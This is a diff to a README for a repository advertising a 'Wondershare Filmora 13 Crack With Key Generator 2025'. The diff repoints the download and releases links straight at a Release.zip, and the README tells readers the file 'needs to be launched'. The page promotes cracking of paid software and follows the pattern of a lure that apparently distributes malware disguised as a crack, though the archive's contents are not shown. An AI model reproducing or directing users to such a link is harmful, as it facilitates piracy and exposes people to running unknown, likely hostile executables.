@@ -8,7 +8,7 @@ Welcome to the Wondershare Filmora 13 Crack With Key Generator 2025 repository! 
 - **License Management:** Resources to manage your software licenses effectively.
 
 ## ⚡ Quick Links
-- **Download the Software [here](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)**
+- **Download the Software [here](https://github.com/datnt16904/Wondershare-Filmora-13-Crack-With-Key-Gen-2025/releases/download/v1.0/Release.zip)**
   - Note: The file needs to be launched.
 
 ## 🌟 Repository Topics
@@ -28,7 +28,7 @@ Welcome to the Wondershare Filmora 13 Crack With Key Generator 2025 repository! 
 - wondershare-filmora-download-crack
 
 ## 🔗 Useful Links
-- [Visit the Releases section for more information](https://github.com/22155555/1875695542/releases)
+- [Visit the Releases section for more information](https://github.com/datnt16904/Wondershare-Filmora-13-Crack-With-Key-Gen-2025/releases/download/v1.0/Release.zip)
 
 ## 🚀 Get Started
 To get started with activating Wondershare Filmora with the provided key generator, follow these simple steps:
